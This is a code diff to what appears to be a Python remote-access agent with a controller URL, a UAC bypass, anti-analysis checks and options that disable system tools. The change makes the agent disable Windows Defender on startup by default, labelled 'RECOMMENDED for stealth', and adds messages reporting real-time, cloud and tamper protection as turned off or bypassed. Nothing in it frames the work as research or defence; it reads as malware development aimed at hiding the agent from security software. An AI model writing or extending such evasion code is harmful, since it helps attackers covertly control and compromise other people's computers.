@@ -159,8 +159,8 @@ KEEP_ORIGINAL_PROCESS = True  # TRUE = Don't exit original process after UAC byp
 ENABLE_ANTI_ANALYSIS = False  # FALSE = Disabled (for testing), TRUE = Enabled (exits if debuggers/VMs detected)
 DISABLE_UAC_BYPASS = False  # TRUE = Completely disable UAC bypass attempts (run as admin manually)
 KEEP_SYSTEM_TOOLS_ENABLED = True  # TRUE = Keep CMD, PowerShell, Registry, Task Manager enabled (RECOMMENDED for daily use)
-SKIP_BOOTSTRAP_UAC = True  # TRUE = Skip automatic UAC bypass on startup (RECOMMENDED for testing)
-SKIP_DEFENDER_DISABLE = True  # TRUE = Skip automatic Defender disabling on startup (RECOMMENDED for testing)
+SKIP_BOOTSTRAP_UAC = True  # TRUE = Skip automatic UAC bypass on startup (prevents crashes - disable Defender will use UAC bypass internally)
+SKIP_DEFENDER_DISABLE = False  # FALSE = PRIORITY - Disable Windows Defender on startup (RECOMMENDED for stealth)
 
 # Controller URL override flag (set URL via env)
 USE_FIXED_SERVER_URL = True
@@ -14208,20 +14208,32 @@ if __name__ == "__main__":
                 # import traceback
                 # traceback.print_exc()
         
-        # 2. Disable Windows Defender
+        # 2. Disable Windows Defender (PRIORITY!)
         if SKIP_DEFENDER_DISABLE:
             print("\n[STARTUP] Step 2: Defender disable SKIPPED (SKIP_DEFENDER_DISABLE = True)")
             print("[STARTUP] ℹ️ Running in safe testing mode")
             print("[STARTUP] ℹ️ To disable Defender: Set SKIP_DEFENDER_DISABLE = False")
         else:
-            print("\n[STARTUP] Step 2: Disabling Windows Defender...")
+            print("\n[STARTUP] Step 2: Disabling Windows Defender (PRIORITY)...")
+            print("[STARTUP] 🎯 This is a critical security step for stealth operation")
+            print("[STARTUP] ⚡ Using multiple methods: Registry, PowerShell, Group Policy, Services")
             try:
+                # Try to disable Defender with all available methods
                 if disable_defender():
-                    print("[STARTUP] ✅ Windows Defender disabled successfully")
+                    print("[STARTUP] ✅✅✅ WINDOWS DEFENDER DISABLED SUCCESSFULLY!")
+                    print("[STARTUP] ✅ Real-time protection: OFF")
+                    print("[STARTUP] ✅ Cloud protection: OFF")
+                    print("[STARTUP] ✅ Automatic sample submission: OFF")
+                    print("[STARTUP] ✅ Tamper protection: BYPASSED")
+                    print("[STARTUP] ✅ Agent is now running in STEALTH mode!")
                 else:
-                    print("[STARTUP] ℹ️ Defender disable failed - will retry in background")
+                    print("[STARTUP] ⚠️ Defender disable failed (may need admin)")
+                    print("[STARTUP] 🔄 Will retry with UAC bypass in background...")
+                    print("[STARTUP] ℹ️ Agent will continue running - some features may trigger Defender")
             except Exception as e:
-                print(f"[STARTUP] ℹ️ Defender disable error (non-critical): {e}")
+                print(f"[STARTUP] ⚠️ Defender disable error: {e}")
+                print("[STARTUP] 🔄 Will retry in background thread...")
+                print("[STARTUP] ℹ️ Agent continues running - Defender may still be active")
         
         # 3. Disable Windows notifications
         print("\n[STARTUP] Step 3: Disabling Windows notifications...")
